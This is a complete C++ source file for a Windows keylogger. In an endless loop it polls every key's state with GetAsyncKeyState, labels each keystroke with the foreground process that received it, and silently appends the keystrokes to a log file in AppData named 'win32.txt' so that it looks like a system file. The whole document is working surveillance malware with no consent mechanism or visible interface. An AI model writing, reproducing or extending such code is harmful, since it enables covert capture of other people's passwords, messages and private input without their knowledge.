#include <iostream>
#include <Windows.h>
#include <psapi.h>
#include <vector>
#include <fstream>
#include <string>
#include <unordered_map>

const char* LOG_FILE = "C:\\Users\\DrewQ\\AppData\\Local\\win32.txt";

static const std::unordered_map<std::string, std::string> replacements{
    {"Tab", "   "},
    {"Enter", "\n"},
    {"Space", " "},
    {"Shift", " [SHIFT] "},
    {"Ctrl", " [CTRL] " },
    { "Alt", " [ALT] " },
    {"Caps Lock", " [Caps Lock] "},
    {"Backspace", " [Backspace] "}
};

std::string getCurrentProcessName() {
    HWND hWnd = GetForegroundWindow();

    if (!hWnd) {
        return "<no foreground window>";
    }

    DWORD pid = 0;
   
    GetWindowThreadProcessId(hWnd, &pid);

    if (pid <= 0)
        return "<unknown>";

    HANDLE hProcess = OpenProcess(
        PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
        FALSE,
        pid
    );

    if (!hProcess)
        return "<access denied>";

    char name[MAX_PATH] = { 0 };
    if (GetModuleBaseNameA(hProcess, NULL, name, MAX_PATH) == 0) {
        CloseHandle(hProcess);
        return "<unknown>";
    }

    CloseHandle(hProcess);
    return std::string(name);
}

std::string getKeyNameFromVk(int vkCode) {
    // Ignore nonsense / reserved vk
    if (vkCode <= 0 || vkCode == 255) {
        return "UNKNOWN";
    }

    UINT scanCode = MapVirtualKeyA(vkCode, MAPVK_VK_TO_VSC);
    if (scanCode != 0) {
        // Build lParam: scan code in bits 16-23, extended bit in 24 if needed
        LONG lParam = static_cast<LONG>(scanCode) << 16;

        char name[64] = { 0 };
        int len = GetKeyNameTextA(lParam, name, sizeof(name));
        if (len > 0) {
            return std::string(name, len);
        }
    }
    return "VK_" + std::to_string(vkCode);
}

void writeKeysToLogfile(std::vector<std::string> keys, std::string processName) {
    if (keys.empty()) {
        return;
    }
    std::ofstream file(LOG_FILE, std::ios::app);

    if (!file.is_open()) {
        return;
    }
    file << "\n--------------------------------------------------" << std::endl;
    file << "Keys from Process: " << processName << std::endl;

    for (const std::string& key : keys) {
        auto it = replacements.find(key);
        if (it != replacements.end()) {
            file << it->second;
        }
        else {
            file << key;
        }
    }
    file << "\n--------------------------------------------------" << std::endl;
}

void Keylogger() {
    std::string lastWindow = getCurrentProcessName();
    std::string newWindow;
    std::vector<std::string> keys{};
    while (true) {
        for (int keyCode = 5; keyCode < 256; ++keyCode) {
            if (GetAsyncKeyState(keyCode) & 0x01) {
                newWindow = getCurrentProcessName();
                // We dont want to spam write to a file on disk, so we will write only when the user changes windows...
                if (lastWindow != newWindow) {
                    writeKeysToLogfile(keys, lastWindow);
                    lastWindow = newWindow;
                    keys.clear();
                }
                std::string keyChar = getKeyNameFromVk(keyCode);
                keys.push_back(keyChar);
            }
        }
        Sleep(65);
    }

}

int main() {
    Keylogger();
    return 0;
}